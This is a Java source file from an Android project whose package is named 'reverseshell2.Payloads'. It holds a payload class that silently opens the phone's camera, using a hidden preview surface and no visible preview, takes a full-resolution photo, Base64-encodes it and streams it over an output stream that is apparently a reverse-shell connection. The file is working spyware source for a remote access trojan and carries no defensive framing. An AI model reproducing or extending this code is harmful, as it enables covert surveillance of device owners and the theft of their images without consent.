package com.example.reverseshell2.Payloads;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.util.Log;

import android.util.Base64;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;

import java.util.List;


public class CameraPreview {
    private Camera camera;
    private Context context;
    private OutputStream out;
    static String TAG = "cameraPreviewClass";

    public CameraPreview(Context context) {
        try {
            this.context =context;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void startUp(int cameraID, OutputStream outputStream) {
        this.out = outputStream;
        try{
        camera = Camera.open(cameraID);
        }catch (RuntimeException e){
            e.printStackTrace();
            try {
                out.write("END123\n".getBytes("UTF-8"));
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
        Camera.Parameters parameters = camera.getParameters();
        List<Camera.Size> allSizes = parameters.getSupportedPictureSizes();
        Camera.Size size = allSizes.get(0);
        for (int i = 0; i < allSizes.size(); i++) {
            if (allSizes.get(i).width > size.width)
                size = allSizes.get(i);
        }

        parameters.setPictureSize(size.width, size.height);
        camera.setParameters(parameters);
        try {
        camera.setPreviewTexture(new SurfaceTexture(0));
        camera.startPreview();
        } catch (Exception e) {
            e.printStackTrace();
        }
        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                sendPhoto(data);
            }
        });
    }

    private void sendPhoto(byte[] data) {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, bos);

        byte[] byteArr = bos.toByteArray();
        final String encodedImage = Base64.encodeToString(byteArr, Base64.DEFAULT);
        Thread thread = new Thread(new Runnable(){
                @Override
                public void run() {
                    try {
                        out.write(encodedImage.getBytes("UTF-8"));
                        out.write("END123\n".getBytes("UTF-8"));
                    } catch (Exception e) {
                        Log.e(TAG, e.getMessage());
                    }
                }
            });
            thread.start();
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview();
            camera.release();
            camera = null;
        }
    }
}